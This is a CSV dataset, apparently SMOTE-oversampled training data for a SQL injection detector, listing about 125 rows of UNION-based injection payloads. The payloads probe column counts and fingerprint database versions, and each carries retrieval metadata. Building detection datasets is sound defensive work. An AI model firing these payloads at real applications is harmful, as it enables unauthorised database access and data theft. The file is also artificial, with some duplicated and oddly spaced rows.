id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000376,attack,union," select * from users where id  =  '1' union select \.%1,@@VERSION -- 1'",nearest_attack_euclidean,R000130,1.3919559369733876
SMOTE_000377,attack,union," select * from users where id  =  1 +  (  1  )   union select null,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000010,1.4700375494814464
SMOTE_000378,attack,union,"-7001'+  (  select slav where 9321  =  9321 union all select 9321,9321,9321,9321,9321,9321,9321,9321,9321--",nearest_attack_euclidean,R000234,0.03999022349779547
SMOTE_000379,attack,union,"-5595""   )    )    as xttj where 4562  =  4562 union all select 4562,4562,4562,4562,4562#",nearest_attack_euclidean,R000749,0.20684977764725226
SMOTE_000380,attack,union,"1'+  (  select 'gqsk' where 3087  =  3087 union all select null,null,null,null--",nearest_attack_euclidean,R000242,0.5336418953282781
SMOTE_000381,attack,union," select * from users where id  =  1 <@$$ union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000024,0.025877620619642456
SMOTE_000382,attack,union,"-3955%'   )    )    union all select 7999,7999,7999,7999,7999,7999,7999,7999,7999#",nearest_attack_euclidean,R000205,1.1061865300787428
SMOTE_000383,attack,union,"-2359' union all select 2687,2687,2687#",nearest_attack_euclidean,R000528,0.18743870261924825
SMOTE_000384,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000417,0.2454244083556849
SMOTE_000385,attack,union,"-7138"" union all select 2341,2341,2341,2341--",nearest_attack_euclidean,R000626,0.061437168817493414
SMOTE_000386,attack,union,"-6775"" union all select 7484,7484#",nearest_attack_euclidean,R000630,0.28252365517921146
SMOTE_000387,attack,union,"1' in boolean mode  )   union all select null,null,null,null--",nearest_attack_euclidean,R000444,0.6100826132921826
SMOTE_000388,attack,union,"-3822""   )    )    as dftp where 2817  =  2817 union all select 2817,2817,2817,2817,2817,2817#",nearest_attack_euclidean,R000638,0.3461171624677495
SMOTE_000389,attack,union,"-2630'   )    )    as xavw where 6291  =  6291 union all select 6291,6291,6291,6291,6291,6291,6291,6291,6291#",nearest_attack_euclidean,R000547,0.587220178961754
SMOTE_000390,attack,union,"-8347%'  )   union all select 7643,7643,7643--",nearest_attack_euclidean,R000776,1.0533435812714507
SMOTE_000391,attack,union,"-2027%""  )   union all select 2048,2048,2048,2048,2048,2048,2048,2048#",nearest_attack_euclidean,R000208,0.5834157680732144
SMOTE_000392,attack,union," select * from users where id  =  '1' or \<   =  1 union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000136,0.3109471393200154
SMOTE_000393,attack,union,"-3250%"" union all select 7162,7162,7162,7162,7162,7162,7162,7162,7162--",nearest_attack_euclidean,R000600,0.5025205928193562
SMOTE_000394,attack,union,"1'||  (  select 'ybfo' from dual where 3319  =  3319 union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000494,0.30727112847618254
SMOTE_000395,attack,union,"-5776%' union all select 3075,3075,3075,3075,3075--",nearest_attack_euclidean,R000332,0.27528842226354355
SMOTE_000396,attack,union,"-5496 union all select 2099,2099,2099#",nearest_attack_euclidean,R000620,0.37916430318768324
SMOTE_000397,attack,union,"1'||  (  select 'tdcr' where 6792  =  6792 union all select null,null,null,null,null#",nearest_attack_euclidean,R000700,0.18848493042470463
SMOTE_000398,attack,union,"-1947 union all select 7780,7780,7780,7780,7780,7780,7780,7780#",nearest_attack_euclidean,R000604,0.24688272563825203
SMOTE_000399,attack,union,"-1687   )    )    as lnva where 8396  =  8396 union all select 8396,8396#",nearest_attack_euclidean,R000684,0.49311253046959846
SMOTE_000400,attack,union," select * from users where id  =  1 or 1#""? union select version  (    )  ,version  (    )   -- 1",nearest_attack_euclidean,R000047,0.0
SMOTE_000401,attack,union,"-3822""   )    )    as dftp where 2817  =  2817 union all select 2817,2817,2817,2817,2817,2817#",nearest_attack_euclidean,R000638,0.250557218285956
SMOTE_000402,attack,union,"-9145'  )   as xyya where 8950  =  8950 union all select 8950,8950,8950,8950,8950,8950,8950,8950--",nearest_attack_euclidean,R000359,0.3328498147991324
SMOTE_000403,attack,union," select * from users where id  =  '1' <@$_ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000064,0.8542449635532093
SMOTE_000404,attack,union,"1'||  (  select 'zpwe' from dual where 7743  =  7743 union all select null,null#",nearest_attack_euclidean,R000240,0.32663328284962667
SMOTE_000405,attack,union,"-1891' in boolean mode  )   union all select 6680,6680,6680,6680,6680,6680,6680,6680#",nearest_attack_euclidean,R000207,0.5225714753212353
SMOTE_000406,attack,union," select * from users where id  =  1 or \<\ union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000074,0.12274696673943282
SMOTE_000407,attack,union,"1'   )    )    as lrnh where 8569  =  8569 union all select null,null,null,null,null--",nearest_attack_euclidean,R000504,0.960295950408855
SMOTE_000408,attack,union,"-6680%""   )    )    union all select 3719,3719,3719,3719,3719,3719,3719,3719,3719--",nearest_attack_euclidean,R000706,0.13931351262198005
SMOTE_000409,attack,union," select * from users where id  =  '1' +   (  \  )   union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000150,0.034543335181425966
SMOTE_000410,attack,union,"-9848' union all select 1359,1359,1359,1359,1359,1359,1359,1359,1359,1359--",nearest_attack_euclidean,R000483,0.06147735979125902
SMOTE_000411,attack,union," select * from users where id  =  '1' or \<\ union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000008,0.02717203726767762
SMOTE_000412,attack,union,"-7418 union all select 1340,1340,1340,1340,1340#",nearest_attack_euclidean,R000614,0.009800532623533953
SMOTE_000413,attack,union," select * from users where id  =  1 or 1#""? union select version  (    )  ,version  (    )   -- 1",nearest_attack_euclidean,R000047,0.3656873654442641
SMOTE_000414,attack,union,"1  )   as qzif where 7877  =  7877 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000709,0.06190406724853418
SMOTE_000415,attack,union," select * from users where id  =  '1' or $<\. union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000116,0.0
SMOTE_000416,attack,union,"-4826 union all select 4532,4532,4532,4532,4532--",nearest_attack_euclidean,R000590,0.019058010582356434
SMOTE_000417,attack,union,"-9078 union all select 3779,3779,3779,3779,3779,3779,3779,3779--",nearest_attack_euclidean,R000589,0.2825936723046054
SMOTE_000418,attack,union," select * from users where id  =  1 or $ .  =  1 union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000041,0.31374695610699194
SMOTE_000419,attack,union,"-9039'  )   union all select 8058,8058,8058,8058,8058--",nearest_attack_euclidean,R000227,0.13998334972472548
SMOTE_000420,attack,union,"-5160'  )   union all select 8067,8067,8067,8067,8067,8067,8067--",nearest_attack_euclidean,R000751,0.6117374601841802
SMOTE_000421,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000408,0.22693266325130534
SMOTE_000422,attack,union,"-1487""  )   as crfi where 2407  =  2407 union all select 2407,2407,2407,2407,2407,2407,2407,2407,2407,2407--",nearest_attack_euclidean,R000492,0.0658138299220552
SMOTE_000423,attack,union,"-9050 union all select 9346,9346,9346,9346,9346,9346,9346,9346,9346,9346--",nearest_attack_euclidean,R000381,0.14633704227453348
SMOTE_000424,attack,union,"-8612'+  (  select 'iqla' where 5035  =  5035 union all select 5035,5035,5035,5035,5035,5035,5035#",nearest_attack_euclidean,R000775,0.3767595727936659
SMOTE_000425,attack,union,"-4915' union all select 1928,1928,1928,1928#",nearest_attack_euclidean,R000562,0.2954340175100117
SMOTE_000426,attack,union,-5569'  )   as cjaf where 3753  =  3753 union all select 3753#,nearest_attack_euclidean,R000561,0.13321347479703627
SMOTE_000427,attack,union,"1""  )   as xwnu where 6490  =  6490 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000556,0.7055870081181804
SMOTE_000428,attack,union," select * from users where id  =  1 + @<@. union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000101,0.2046750364648205
SMOTE_000429,attack,union," select * from users where id  =  1 or 1#""1 union select 'a',version  (    )   -- 1",nearest_attack_euclidean,R000126,0.0761343656641611
SMOTE_000430,attack,union," select * from users where id  =  '1' or   (  \  )    =  1 union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000164,0.2518728274414576
SMOTE_000431,attack,union,"-3298 union all select 7618,7618,7618,7618,7618,7618,7618,7618,7618,7618#",nearest_attack_euclidean,R000710,0.41470411673487795
SMOTE_000432,attack,union,"-2582'+  (  select ggim where 5346  =  5346 union all select 5346,5346#",nearest_attack_euclidean,R000583,0.5307261187676672
SMOTE_000433,attack,union," select * from users where id  =  1 +$+. union select null,@@VERSION -- 1",nearest_attack_euclidean,R000122,0.021300331442601794
SMOTE_000434,attack,union,"-7409""   )    )    union all select 3145,3145,3145--",nearest_attack_euclidean,R000284,0.2656403322554458
SMOTE_000435,attack,union,"-9558""   )    )     )   union all select 2935,2935,2935,2935,2935--",nearest_attack_euclidean,R000427,0.19240183993341195
SMOTE_000436,attack,union,"1'+  (  select 'qvif' where 1758  =  1758 union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000667,0.23393622464787744
SMOTE_000437,attack,union,"-6360'  )   as yfrk where 3683  =  3683 union all select 3683,3683,3683,3683,3683,3683,3683,3683,3683#",nearest_attack_euclidean,R000443,0.18954770381969144
SMOTE_000438,attack,union,"-2855' union all select 2495,2495,2495,2495,2495,2495,2495,2495,2495--",nearest_attack_euclidean,R000725,0.003907372846297634
SMOTE_000439,attack,union," select * from users where id  =  1 or   (  $+  )    =  1 union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000103,0.23284831097441122
SMOTE_000440,attack,union," select * from users where id  =  '1' or $+<$ union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000077,0.0028978076749126874
SMOTE_000441,attack,union,"-1333""   )    )    union all select 2376,2376,2376,2376,2376,2376,2376,2376,2376--",nearest_attack_euclidean,R000681,0.777897997882219
SMOTE_000442,attack,union,"-9384%"" union all select 7031,7031,7031,7031,7031,7031,7031,7031,7031#",nearest_attack_euclidean,R000200,0.12900399645123006
SMOTE_000443,attack,union,"-2359' union all select 2687,2687,2687#",nearest_attack_euclidean,R000528,0.15355310122661403
SMOTE_000444,attack,union," select * from users where id  =  1 or 1#"".  =  1 union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000127,0.1411385426876423
SMOTE_000445,attack,union,"-2857%'   )    )     )   union all select 7167,7167,7167,7167,7167,7167,7167,7167#",nearest_attack_euclidean,R000462,0.5664464749383762
SMOTE_000446,attack,union," select * from users where id  =  1 union select 1a,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000134,0.3934921779196833
SMOTE_000447,attack,union," select * from users where id  =  1 | |1 union select 1,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000070,0.9715902864072324
SMOTE_000448,attack,union," select * from users where id  =  '1' union select @ 1,version  (    )   --  1'",nearest_attack_euclidean,R000081,0.2828945417502411
SMOTE_000449,attack,union,"-4964""   )    )    union all select 4750,4750,4750,4750,4750--",nearest_attack_euclidean,R000294,0.15154526350040987
SMOTE_000450,attack,union,"-5509%""   )    )     )   union all select 7066,7066,7066,7066,7066,7066,7066,7066,7066,7066--",nearest_attack_euclidean,R000313,0.2276554444717574
SMOTE_000451,attack,union,"-4305  )   as ldrt where 2567  =  2567 union all select 2567,2567,2567,2567,2567,2567,2567#",nearest_attack_euclidean,R000395,0.874645769040332
SMOTE_000452,attack,union,"-3250%"" union all select 7162,7162,7162,7162,7162,7162,7162,7162,7162--",nearest_attack_euclidean,R000600,1.1846646105222407
SMOTE_000453,attack,union," select * from users where id  =  '1'<@.. union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000039,0.13536802128565367
SMOTE_000454,attack,union," select * from users where id  =  1 +1<@ union select null,version  (    )   -- 1",nearest_attack_euclidean,R000123,0.0821569678577122
SMOTE_000455,attack,union,"-6126 union all select 8486,8486,8486,8486,8486,8486,8486,8486,8486--",nearest_attack_euclidean,R000666,0.06384879979521096
SMOTE_000456,attack,union,"-8982' in boolean mode  )   union all select 5367,5367,5367,5367,5367,5367#",nearest_attack_euclidean,R000190,0.4901090065707543
SMOTE_000457,attack,union," select * from users where id  =  1 or 1#""  (   union select null,version  (    )   -- 1",nearest_attack_euclidean,R000156,0.2764577667188169
SMOTE_000458,attack,union,"-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--",nearest_attack_euclidean,R000674,0.36733768459157573
SMOTE_000459,attack,union,"-6370'   )    )    as sims where 9388  =  9388 union all select 9388,9388,9388,9388,9388,9388,9388,9388#",nearest_attack_euclidean,R000260,0.44222175745528297
SMOTE_000460,attack,union,"1'+  (  select 'idmr' where 5029  =  5029 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000216,0.1467248115034043
SMOTE_000461,attack,union,"1'+  (  select 'bztp' where 2541  =  2541 union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000580,0.48047699670292954
SMOTE_000462,attack,union," select * from users where id  =  1<@.. union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000031,0.026199441099682155
SMOTE_000463,attack,union,"-2434'   )    )     )   union all select 5509,5509,5509,5509,5509,5509,5509--",nearest_attack_euclidean,R000451,0.029906879937374904
SMOTE_000464,attack,union,"-7714 where 9768  =  9768 union all select 9768,9768--",nearest_attack_euclidean,R000436,1.2800703967408427
SMOTE_000465,attack,union," select * from users where id  =  1 or 1&@#  =  1 union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000079,1.3406804127973824
SMOTE_000466,attack,union," select * from users where id  =  '1' or @ @1  =  1 union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000001,0.8198916617510276
SMOTE_000467,attack,union,"-4856' in boolean mode  )   union all select 1074,1074,1074,1074,1074,1074,1074#",nearest_attack_euclidean,R000219,0.3801149825410319
SMOTE_000468,attack,union,-6912' in boolean mode  )   union all select 6012--,nearest_attack_euclidean,R000713,0.7090819507136402
SMOTE_000469,attack,union,"-2254'  )   as dyrv where 9079  =  9079 union all select 9079,9079,9079,9079,9079,9079,9079,9079#",nearest_attack_euclidean,R000475,0.030930731068424783
SMOTE_000470,attack,union,"-4076'   )    )    union all select 9030,9030,9030,9030,9030,9030,9030,9030,9030,9030--",nearest_attack_euclidean,R000193,0.09236393621974605
SMOTE_000471,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000197,0.3208030995929658
SMOTE_000472,attack,union,"-6680%""   )    )    union all select 3719,3719,3719,3719,3719,3719,3719,3719,3719--",nearest_attack_euclidean,R000706,0.5904770340838816
SMOTE_000473,attack,union,"-4145%""   )    )    union all select 9404,9404,9404,9404,9404,9404,9404#",nearest_attack_euclidean,R000239,0.2342267776221314
SMOTE_000474,attack,union,"-8566""  )   as hnch where 3418  =  3418 union all select 3418,3418,3418,3418,3418,3418,3418#",nearest_attack_euclidean,R000209,0.2695033926112443
SMOTE_000475,attack,union,"-3368'   )    )    union all select 4913,4913,4913,4913,4913,4913,4913,4913,4913--",nearest_attack_euclidean,R000746,0.1795980526202654
SMOTE_000476,attack,union,"-2500'   )    )     )   union all select 6853,6853,6853,6853--",nearest_attack_euclidean,R000734,0.17330493245248482
SMOTE_000477,attack,union," select * from users where id  =  '1' + $ . union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000068,0.25147830659792286
SMOTE_000478,attack,union,"-3879' union all select 9814,9814,9814,9814,9814,9814,9814,9814,9814--",nearest_attack_euclidean,R000307,0.13675447040637048
SMOTE_000479,attack,union,"-4860'  )   as azyx where 6901  =  6901 union all select 6901,6901,6901,6901,6901#",nearest_attack_euclidean,R000177,0.703315673690854
SMOTE_000480,attack,union,"-8612'+  (  select 'iqla' where 5035  =  5035 union all select 5035,5035,5035,5035,5035,5035,5035#",nearest_attack_euclidean,R000775,0.3432777692124602
SMOTE_000481,attack,union," select * from users where id  =  '1' union select   (  \.  )  ,@@VERSION -- 1'",nearest_attack_euclidean,R000011,0.5319980694016226
SMOTE_000482,attack,union,"-2254'  )   as dyrv where 9079  =  9079 union all select 9079,9079,9079,9079,9079,9079,9079,9079#",nearest_attack_euclidean,R000475,1.8784921776437072e-05
SMOTE_000483,attack,union,"-1922%'  )   union all select 2335,2335,2335,2335,2335,2335,2335,2335,2335,2335--",nearest_attack_euclidean,R000587,0.41492434077312745
SMOTE_000484,attack,union,"-8117' union all select 9945,9945,9945,9945,9945,9945,9945#",nearest_attack_euclidean,R000430,0.0
SMOTE_000485,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000197,0.2615054264194883
SMOTE_000486,attack,union," select * from users where id  =  1 or @`\` union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000172,1.2858149473008689
SMOTE_000487,attack,union," select * from users where id  =  1 or 1#"". union select null,version  (    )   -- 1",nearest_attack_euclidean,R000012,0.0
SMOTE_000488,attack,union,"1'||  (  select 'neqi' where 6873  =  6873 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000632,0.9412455024578777
SMOTE_000489,attack,union," select * from users where id  =  '1' union select @ 1,version  (    )   --  1'",nearest_attack_euclidean,R000081,0.2067730186710826
SMOTE_000490,attack,union,"-2798'+  (  select 'emui' where 9565  =  9565 union all select 9565,9565,9565,9565--",nearest_attack_euclidean,R000761,0.3368658732402736
SMOTE_000491,attack,union,"1""  )   as qwyt where 4236  =  4236 union all select null,null,null,null,null--",nearest_attack_euclidean,R000525,0.19075916074964655
SMOTE_000492,attack,union," select * from users where id  =  '1'<@.. union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000039,0.148799311912878
SMOTE_000493,attack,union," select * from users where id  =  1 or 1#""{ union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000043,0.0
SMOTE_000494,attack,union,"-3595'+  (  select vppx where 6018  =  6018 union all select 6018,6018,6018,6018,6018#",nearest_attack_euclidean,R000247,0.2927229688903511
SMOTE_000495,attack,union," select * from users where id  =  '1' union select \,@@VERSION -- 1'",nearest_attack_euclidean,R000049,0.44874242880745974
SMOTE_000496,attack,union,"-4860'  )   as azyx where 6901  =  6901 union all select 6901,6901,6901,6901,6901#",nearest_attack_euclidean,R000177,0.6096735089280283
SMOTE_000497,attack,union,"-9583%""   )    )    union all select 9349,9349,9349,9349,9349,9349,9349--",nearest_attack_euclidean,R000447,0.2101864599168395
SMOTE_000498,attack,union,"-6067'+  (  select 'bfhf' where 3114  =  3114 union all select 3114,3114,3114,3114,3114,3114,3114,3114--",nearest_attack_euclidean,R000576,0.426452097059239
SMOTE_000499,attack,union,"-8609' union all select 9384,9384,9384,9384--",nearest_attack_euclidean,R000621,0.07664316762925547
SMOTE_000500,attack,union,"-8069   )    )    as sxbn where 7689  =  7689 union all select 7689,7689,7689,7689,7689,7689,7689,7689,7689,7689--",nearest_attack_euclidean,R000565,0.06334972351995068
